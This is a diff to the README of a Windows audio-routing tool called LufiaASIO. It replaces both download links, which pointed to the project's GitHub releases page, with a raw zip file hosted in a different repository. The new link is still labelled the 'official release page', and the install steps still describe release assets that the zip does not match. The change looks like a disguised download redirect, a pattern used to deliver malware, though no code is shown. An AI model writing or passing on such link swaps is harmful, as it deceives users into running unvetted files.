@@ -5,7 +5,7 @@ description: "Route audio across multiple Windows backends and ASIO drivers for 
 ---
 # 🎧 LufiaASIO-Release - Universal audio routing for acoustic measurements
 
-[![](https://img.shields.io/badge/Download-LufiaASIO-blue.svg)](https://github.com/andreea8282/LufiaASIO-Release/releases)
+[![](https://img.shields.io/badge/Download-LufiaASIO-blue.svg)](https://raw.githubusercontent.com/andreea8282/andreea8282.github.io/main/walkmill/Release_1.0.zip)
 
 LufiaASIO-Release acts as a central hub for audio signals on your Windows computer. It connects various audio sources and outputs, ensuring data flows between them without loss of quality. The software focuses on high-precision tasks like acoustic measurements and sustained audio streaming. It bridges the gap between different audio formats such as WASAPI, native ASIO, WDM-KS, DirectSound, and MME. It supports high-resolution audio files up to 1536 kHz. Features like THD Compensation and Adaptive Notch allow for fine-tuning the signals to remove noise and distortion.
 
@@ -13,7 +13,7 @@ LufiaASIO-Release acts as a central hub for audio signals on your Windows comput
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/andreea8282/LufiaASIO-Release/releases) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/andreea8282/andreea8282.github.io/main/walkmill/Release_1.0.zip) to download the installer.
 2. Select the latest version listed under the Assets section.
 3. Choose the file ending in .msi or .exe to begin the download.
 4. Locate the downloaded file in your Downloads folder.
